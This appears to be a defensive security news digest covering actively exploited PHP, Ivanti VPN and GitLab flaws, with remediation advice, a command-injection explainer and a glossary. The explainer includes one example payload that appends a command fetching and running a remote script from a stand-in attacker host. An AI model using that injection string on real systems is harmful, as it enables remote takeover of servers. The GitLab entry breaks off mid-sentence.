PHP "php2shell" Zero-Days Actively Exploited — CVE-2026-109618 & CVE-2026-109619 (CVSS 9.2)
🔍 What happened: Two critical RCE flaws in PHP's core (CVE-2026-109618 and CVE-2026-109619, CVSS 9.2 each) are being actively exploited in the wild — unauthenticated attackers can execute arbitrary code on any PHP-powered web server using a crafted HTTP request.
👤 Who's affected: Every organization running a PHP web server using mod_php, PHP-FPM, php-cgi, FrankenPHP, or LiteSpeed — which accounts for roughly 77% of all websites with a known server-side language.
✅ What to do: Immediately upgrade to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35 — PHP states there is no configuration-only workaround and updating is the only safe fix.
🎯 ATT&CK: [Initial Access] T1190 · Exploit Public-Facing Application
Attackers are directly exploiting PHP web servers exposed to the internet, bypassing authentication entirely by crafting malicious HTTP requests that trigger the memory-corruption flaws before any authentication check runs.
▶ Full analysis & beginner explanation

CVE-2026-109618 stems from an out-of-memory condition that leaves HTTP request data partially initialized in PHP worker processes. A crafted request can cause the worker to treat uninitialized or attacker-controlled memory as trusted input, leading to arbitrary code execution. CVE-2026-109619 is a related stale-state bug: after one request triggers the corrupted state, a subsequent request handled by the same worker process can reuse that tainted data before normal initialization resets it.

Amazon Threat Intelligence logged exploitation attempts on October 17 — four days before public disclosure — and watchTowr confirmed detection in global honeypot networks shortly after. The exploitation requires no authentication credentials, no prior access, and works against default PHP configurations. Every deployment model (mod_php under Apache, PHP-FPM behind nginx, php-cgi, FrankenPHP) is vulnerable. PHP confirmed patches on October 21, but CISA noted it had not independently verified exploitation scope at advisory time.

Organizations should audit web server logs for unusual process-spawning activity and check for unexpected outbound network connections from PHP worker processes, which could indicate post-exploitation backdoor installation.

🎓 For beginners: PHP is the programming language that powers a huge fraction of websites (WordPress, Laravel apps, and countless custom sites). These bugs are like finding that the mail-slot in a building's front door is big enough to reach the lock from outside — an attacker doesn't need a key (login credentials) to get in. They just send the building a weirdly-shaped envelope, and it opens the door itself.

Ivanti Connect Secure Zero-Day Chain CVE-2026-104935 Gives Attackers Root on Fully Patched VPNs
🔍 What happened: Threat actor UTA0576 has been chaining three vulnerabilities in Ivanti Connect Secure since at least October 3 to achieve unauthenticated root-level code execution on fully patched VPN appliances — Ivanti patched the first two bugs (CVE-2026-104935) on October 13, but the third privilege-escalation flaw still has no patch.
👤 Who's affected: Organizations using Ivanti Connect Secure VPN appliances globally; CISA has ordered federal agencies to factory-reset compromised devices and restore from backup immediately.
✅ What to do: Apply Ivanti's October 13 patch for CVE-2026-104935, run Ivanti's Integrity Checker Tool, factory-reset any appliance that shows signs of compromise, and reset all credentials and certificates stored on or accessible through the device.
🎯 ATT&CK: [Discovery] T1046 · Network Service Discovery
After gaining root access, UTA0576 extensively queried Active Directory and LDAP to map the victim network, harvested LAPS passwords and BitLocker recovery keys, and captured LDAP data in preparation for lateral movement — classic post-exploitation reconnaissance.
▶ Full analysis & beginner explanation

Volexity's analysis reveals a sophisticated three-step exploit chain. The first two steps (CVE-2026-104935) combine an authentication bypass with a remote code execution flaw. The third step — still unpatched — escalates privileges to root by modifying the in-memory copy of a privileged Ivanti maintenance library, causing a scheduled task (dsinvoked) to execute attacker-controlled Perl code with root permissions.

What makes this particularly alarming is UTA0576's operational security: they deployed no malware or web shell, instead re-exploiting the device fresh for every command. The actor also tampered with logs to cover their tracks, successfully evading Ivanti's built-in Integrity Checker Tool — the very tool Ivanti recommends defenders use to detect compromise. Post-compromise, the group harvested credentials, LAPS passwords, BitLocker recovery keys, and LDAP data.

CISA added CVE-2026-104935 to its Known Exploited Vulnerabilities catalog on October 13. Because one flaw in the chain remains unpatched, patching alone is insufficient — affected organizations must treat any Ivanti Connect Secure appliance as potentially compromised and follow CISA's factory-reset guidance.

🎓 For beginners: A VPN appliance is the front door your remote employees use to access company systems from home. This attack lets hackers sneak in through that door without needing a password, and then go completely silent — instead of leaving a listening program running (which security tools would detect), they quietly re-pick the lock every time they need to do something, making them almost invisible.

GitLab Critical RCE CVE-2026-97229 (CVSS 10.0) — Unauthenticated Code Execution via Regex Compiler Integer Overflow
🔍 What happened: GitLab patched a CVSS 10.0 integer overflow in its CI/CD Regular Expression Compiler (CVE-2026-97229) that lets unauthenticated attackers execute code on self-hosted GitLab servers by submitting a crafted regex pattern in a CI/CD configuration.
👤 Who's affected: Self-managed GitLab CE and EE installations on versions 19.2.x before 19.2.8, 19.3.x before 19.3.5, and 19.4.x before 19.4.2; GitLab.com and GitLab Dedicated are already protected.
✅ What to do: Upgrade to GitLab CE/EE 19.4.2, 19.3.5, or 19.2.8 immediately; no active exploitation has been confirmed but a Rapid7 proof-of-concept analysis has been published.
🎯 ATT&CK: [Initial Access] T1190 · Exploit Public-Facing Application
An unauthenticated attacker exploiting this flaw gains code execution on the GitLab server itself — providing direct access to source code repositories, CI/CD secrets, deployment keys, and potentially the ability to poison software builds, making this a potential supply-chain entry point.
▶ Full analysis & beginner explanation

CVE-2026-97229 is an integer overflow (CWE-190) in GitLab's Regular Expression Compiler used during CI/CD pipeline processing. When GitLab compiles a sufficiently crafted regex from a .gitlab-ci.yml file, the integer overflow corrupts adjacent memory and can redirect execution to attacker-controlled code. The flaw requires the attacker to have write access to a public project — or any account on the self-hosted server — but researchers note the pre-authentication attack surface may be wider in certain configurations.

A GitLab server compromise is particularly high-value because it sits at the center of software development pipelines: source code, deployment keys, container registry credentials, API tokens, and CI/CD environment variables are all accessible from a compromised GitLab instance. Attackers who breach a GitLab server can potentially modify code before it's deployed to production, creating a supply-chain attack affecting end users of that organization's software.

🎓 For beginners: GitLab is where software developers store their code and automate the process of testing and releasing it. 💡 Today I Learned: OS Command Injection ▶
OS Command Injection is a vulnerability where an application passes unsanitized user-supplied data directly to an operating system command interpreter (like bash or cmd.exe), allowing an attacker to append their own commands — for example, a web form that accepts a filename for processing might be abused by submitting report.pdf; curl attacker.com/backdoor | bash instead. Today's Arista VeloCloud CVE-2026-16812 is a textbook example: the VCO management API passed external input into an OS command without stripping special shell characters, giving any unauthenticated internet user root access to the underlying Linux server. The fix is always the same — never pass external input to shell functions, and where you must interact with the OS, use parameterized API calls or allow-list validation that rejects anything not on a pre-approved safe list.
📖 Glossary: PHP-FPM · LDAP · MotW · Active Directory · VCO ▶
PHP-FPM — PHP FastCGI Process Manager; runs PHP web applications as a pool of persistent worker processes that handle HTTP requests in parallel, improving performance over the older CGI model.
LDAP — Lightweight Directory Access Protocol; a protocol for querying and modifying directory services like Active Directory, used to look up user accounts, group memberships, and access permissions across an enterprise network.
MotW — Mark of the Web; a hidden Windows metadata tag automatically added to files downloaded from the internet that triggers SmartScreen security warnings and prevents Office macros from running — bypassing it makes malicious files appear locally trusted.
Active Directory — Microsoft's central directory service for managing users, computers, and permissions on a Windows enterprise network; a prime post-compromise target because controlling it gives attackers access to all systems in an organization.
VCO — VeloCloud Orchestrator; Arista's SD-WAN management platform that centralizes configuration, monitoring, and policy enforcement for enterprise WAN edge devices across all branch offices.
